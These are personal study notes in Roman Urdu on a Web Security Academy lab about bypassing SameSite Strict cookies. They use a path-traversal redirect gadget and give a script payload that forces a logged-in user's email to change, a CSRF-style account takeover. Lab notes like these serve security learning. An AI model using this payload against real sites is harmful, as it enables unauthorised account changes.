https://0a8d003904d2dbe181b7118200200071.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=sameer17@gmail.com&submit=1'

-> To is se ham email change wale page pe a jaye ga, to hamein esa page dhondna pare ga jo hamare request ko redirect kre, to wo jo me ne hello dekha tha us se me not found page pe chala gya tha yani wo page redirect kr rha tha ab jab me url du ga to kaam ho jaye ga

My Account
Your username is: wiener

Your email is: sameer@gmail.com

yeh wala page -->>


https://0a8d003904d2dbe181b7118200200071.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=sameer17@gmail.com&submit=1'

starting me chale ga nhi 
&submit=1 --->> is ke waja se yeh &submit samjhe ga me koi alag parameter hu lakin wo parameter hai my account page ka 
my-account/change-email?email=sameer17@gmail.com&submit=1, so ab ham & ka url encode kr dein ge, to is se wo postId=1 ka parameter ni samjhe ga khud ko baki myaccount ka samjhe ga, and submit 1 se hota yeh hai ke page auto submit ho jata, to script jo likhe wo ye hai


<script>
location = 'https://0a8d003904d2dbe181b7118200200071.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=sameer17@gmail.com%26submit=1'
</script>

ab dekho use website se kaam ho rha and wo hamein le ke ja rhy dusre route par khud he, to ab cookie chale jai ge yeh ham ne redirect kr dia 





Lab -> 11
SameSite Strict bypass via sibling domain